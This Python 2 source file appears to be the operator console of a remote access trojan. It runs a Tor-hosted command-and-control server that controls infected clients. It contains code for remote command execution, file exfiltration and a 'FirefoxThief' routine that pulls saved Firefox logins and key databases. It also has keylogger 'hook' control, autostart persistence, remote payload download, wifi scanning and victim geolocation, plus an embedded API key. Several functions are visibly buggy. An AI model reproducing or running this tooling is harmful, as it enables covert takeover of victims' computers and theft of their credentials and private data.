import socket, ssl, os, sys, time, hashlib, hmac, geoip2.database, subprocess, select, threading
from datetime import datetime
from subprocess import Popen, PIPE, STDOUT, check_output
from clint.textui import colored
from tqdm import tqdm
from colored import fg, bg, attr

# host = T-master host
host = 'l7sj6c7zqgmuck2d.onion'
hasher = hashlib.sha256()
port = 5555
backlog = 5
name = "Master.1"
# loading geoip2
try:
    reader = geoip2.database.Reader('GeoLite2-City.mmdb')
except:
    print ("Can not load GEOIP2-Database")

# init
#pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid uncommented during dev

def Welcome(newStart):
    print "="*79
    print "|  <<<"+colored.cyan("-"*10+"[Starting server] @ "+str(datetime.now())+"-"*10)+">>>  |"
    print "="*79
    print colored.green("<-->") +" "*51 + "#"+ colored.green("  _____ ____  ____   ")+"#"
    if newStart == True:
        bindsocket = socket.socket()
        bindsocket.bind(('', 5555))
        bindsocket.listen(5)
    else:
        pass
    print colored.green("  |--> [Server-Status] running" + " "*25) + "#"+colored.green(" (_   _|___ \|  _ \  ")+"#"
    print (fg(202)+"  |--> [Server-Name] " + name + " "*26 + attr(0)+"#"+fg(202)+"   | |   __) ) |_) ) "+attr(0)+"#")
    print colored.yellow("  |--> [Onion-Host] " + host + " "*13) + "#"+colored.yellow("   | |  / __/|  _ ( ") +" #"
    print colored.yellow("  |--> [Onion-Port] " + str(port) + " "*31) + "#"+colored.yellow("   | | | |___| |_) )")+" #"
    print colored.yellow("  |--> [Onion-Backlog] " + str(backlog)+ " "*31) + "#"+colored.yellow("   |_| |_____)____/ ")+" #"
    print colored.yellow("<-->" +" "*51) + "#"+" "*21+"#" +"\n"+"="*79
    print "# ||  " + "     address "+ " "*10+ "|| cType " + " "*12 + "|| stat "
    print "-"*79
    if newStart == True:
        return bindsocket
    else:
        pass

try:
    bindsocket = Welcome(True)
except socket.error, (value,message):
    print colored.red("Could not open socket: " + message + "!!")
    sys.exit(1)

def RecvData(connstream):
    temp = connstream.read()
    outData = ""
    while temp != "CEND":
        outData += temp
        temp = connstream.read()
    return outData

def ExecIN(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    print (p.stdout.read())

def DigGeoIp(ip):
    response = reader.city(ip)
    country = response.country.name
    city = response.city.name
    print ("|--- " + ip + " " + city + " " + country)

def CheckHash(fileName,fileHashHEX):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
        pass
    else:
        print colored.red("Warning!")

def CalcHash(fileName):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    return hasher.hexdigest()

def ExecIN(cmd):
    out = check_output(cmd, shell=True)
    print (out)

def SendData(connstream, inText):
    connstream.write(inText)
    connstream.write("SEND")

def DownloadFILE(connstream, fileName):
    fileDOWN = open(fileName, 'wa')
    fileSize = int(RecvData(connstream))
    print colored.cyan("[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize))
    FSD = 0
    pbar = tqdm(total=fileSize)
    while 1:
        temp = RecvData(connstream)
        if temp == 'CUF':
            break
        else:
            FSD += len(temp)
            fileDOWN.write(temp)
            pbar.update(len(temp))
    pbar.close()
    fileDOWN.close()
    print ("")

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    fileSize = os.path.getsize(fileName)
    print colored.green("[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize))
    FSD = 0
    pbar = tqdm(total=fileSize)
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            FSD += len(tempData)
            SendData(connstream, tempData)
            pbar.update(len(tempData))
    pbar.close()
    fileUP.close()
    print ("")
    SendData("SUF") #Server Upload Finished

def PrintListClients():
    ExecIN("clear")
    Welcome(False)
    for i in listClients:
        try:
            SendData(sockClients[listClients.index(i)],"alive")
            stat = RecvData(sockClients[listClients.index(i)])
            print str(listClients.index(i))+" < "+colored.yellow(str(i)+" :: "+stat)
            print "-"*79
            continue
        except socket.error:
            del sockClients[listClients.index(i)]
            del listClients[listClients.index(i)]
            return False
    return True

listClients = []
sockClients = []

while True:
    try:
        inputready,outputready,exceptready = select.select([bindsocket],[],[],2)
        for s in inputready:
            if s == bindsocket:
                client, address = bindsocket.accept()
                listClients.append(address)
                sockClients.append(ssl.wrap_socket(client, server_side=True, certfile="server.crt", keyfile="server.key"))
                time.sleep(2)
            else:
                pass
        if PrintListClients() == True:
            pass
        else:
            chunk = PrintListClients()
    except KeyboardInterrupt:
        try:
            numb = int(raw_input("\n[choose #] "))
            SendData(sockClients[numb],"alive")
        except:
            print "Bad option, exit!"
            for i in listClients:
                try:
                    SendData(sockClients[listClients.index(i)],"terminate")
                except:
                    pass
            time.sleep(1)
            bindsocket.close()
            time.sleep(1)
            sys.exit(0)
        stat = RecvData(sockClients[numb])
        print ("    ====[activating-client] "+str(listClients[numb])+" :: "+stat.split("::")[0]+" ==== ")
        while True:
            inText = raw_input(colored.white('<T2B:')+colored.yellow(stat.split("::")[0]+'> '))
            if inText.startswith("download"):
                SendData(sockClients[numb],inText)
                DownloadFILE(sockClients[numb],inText.split("|")[1])
            elif inText.startswith("upload"):
                SendData(sockClients[numb],inText)
                UploadFILE(sockClients[numb],inText.split(" ")[1])
                chunk = RecvData(sockClients[numb])
            elif inText.startswith("!"):
		        ExecIN(inText.split("!")[1])
            elif inText.startswith('s-wifi'):
                SendData(sockClients[numb],"get-inferfaces")
                # retrieve list of wireless card, if present scan else print error and go on
                print colored.cyan(RecvData(sockClients[numb]))
                card = raw_input("[*] Enter wifi card name (type none for no card): ")
                if card == "none":
                    print colored.red("ScanWIFI stopped")
                else:
                    SendData(sockClients[numb],"ScanWIFI :" + card)
                    report = RecvData(sockClients[numb])
                    while report != "ScanWIFI-finished":
                        print colored.cyan("|--- " + report)
                        report = RecvData(sockClients[numb])
            elif inText == "mapMe":
                SendData(sockClients[numb],"get-inferfaces")
                print colored.cyan(RecvData(sockClients[numb]))
                card = raw_input("[*] Enter wifi card name (type none for no card): ")
                if card == "none":
                    print colored.red("mapMe stopped")
                else:
                    SendData(sockClients[numb],"mapMe:"+card+":AIzaSyDpDfMrucSghsQ90Xf0NltpA0wcbQewZnQ")
                mapped = RecvData(sockClients[numb])
                if mapped.startswith("Error"):
                    print colored.red(mapped)
                else:
                    print colored.cyan(mapped)
            elif inText == "info":
                SendData(sockClients[numb],"info:d94a59a2050391cf84f417f827769b622812f6ad59b8f50efd788f6de8d20341")
                infos = RecvData(sockClients[numb])
                print ("====" + stat.split("::")[0] + "====")
                while infos != "end-info":
                    if infos.startswith('ip'):
                        if infos.split(':')[1].startswith('Error'):
                            print ("|--- " + infos)
                        else:
                            DigGeoIp(infos.split(':')[1])
                    else:
                        print ("|--- " + infos)
                    infos = RecvData(sockClients[numb])
            elif inText == "terminate":
                SendData(sockClients[numb],"terminate")
                print colored.red("    ====[exit-client] "+str(listClients[numb])+" :: "+stat.split("::")[0]+" ====")
                sockClients[numb].close()
                del sockClients[numb]
                del listClients[numb]
                break
            elif inText == "FirefoxThief":
                SendData(sockClients[numb],"FirefoxThief")
                plat = RecvData(sockClients[numb])
                if plat.startswith("Ok"):
                    listDir = RecvData()
                    if listDir.startswith("Error"):
                        print colored.red(listDir)
                    else:
                        print "[profiles]\n"
                        print (listDir)
                        newdir = raw_input("[DumpDir] ")
                        SendData(sockClients[numb],newdir)
                        DownloadFILE(sockClients[numb],"profiles.ini")
                        profileDir = RecvData(sockClients[numb])
                        print (profileDir)
                        maindir = raw_input("[MainDir] ")
                        SendData(sockClients[numb],maindir)
                        print colored.green("[+] Dumping cert8.db, key3.db and logins.json...")
                        DownloadFILE(sockClients[numb],"cert8.db")
                        DownloadFILE(sockClients[numb],"key3.db")
                        DownloadFILE(sockClients[numb],"logins.json")
                        print colored.green("Finished")
                elif plat.startswith("Error"):
                    print colored.red(plat)
                else:
                    print colored.red("Error not handled")
            elif inText.startswith("hook"):
                if inText == "hook" or inText == "hook:":
                    print colored.yellow("usage:\n"+"-- start --> hook:ON:namefile.txt\n"+"-- check --> hook:check\n"+"-- stop --> hook:OFF\n")
                    print colored.cyan("Suggested name: "+time.ctime().replace(" ", "-"))
                    usage = raw_input("< ")
                    SendData(sockClients[numb],usage)
                    retstat = RecvData(sockClients[numb])
                    if retstat.startswith("Error"):
                        print colored.red(retstat)
                    else:
                        print colored.green("==> HOOK"+retstat)
                else:
                    if inText.split(":")[1] == "ON" or inText.split(":")[1] == "check" or inText.split(":")[1] == "OFF":
                        SendData(sockClients[numb],inText)
                        retstat = RecvData(sockClients[numb])
                        print colored.green("==> HOOK: "+retstat)
                    else:
                        print colored.yellow("usage:\n -- start --> hook:ON:namefile.txt \n -- check --> hook:check \n -- stop --> hook:OFF\n")
                        usage = raw_input("< ")
                        SendData(sockClients[numb],usage)
                        retstat = RecvData(sockClients[numb])
                        if retstat.startswith("Error"):
                            print colored.red(retstat)
                        else:
                            print colored.green("==> HOOK"+retstat)
            elif inText.startswith('protect'):
                    SendData(sockClients[numb],inText)
                    inText = RecvData(sockClients[numb])
                    while inText != 'END':
                        print (inText)
                        inText = RecvData(sockClients[numb])
            elif inText.startswith("exec"):
                SendData(sockClients[numb],inText)
                print ("")
                outEXEC = RecvData(sockClients[numb])
                print (outEXEC)
            elif inText.startswith("downhttp"):
                SendData(sockClients[numb],inText)
                httpReturn = RecvData(sockClients[numb])
                if httpReturn.startswith("Error"):
                    print colored.red(httpReturn)
                else:
                    print colored.green(httpReturn)
            elif inText.startswith("set"):
                if inText.split(":")[1] == "autostart":
                    SendData(sockClients[numb],inText)
                    plat = RecvData(sockClients[numb])
                    print colored.green(plat)
                elif inText.split(":")[1] == "folder":
                    SendData(sockClients[numb],inText)
                    folder = RecvData(sockClients[numb])
                    print colored.green(folder)
                else:
                    print "usage: autostart or folder"
            else:
                SendData(sockClients[numb],inText)
                outTT = RecvData(sockClients[numb])
                print colored.cyan('[outText] ' + outTT)
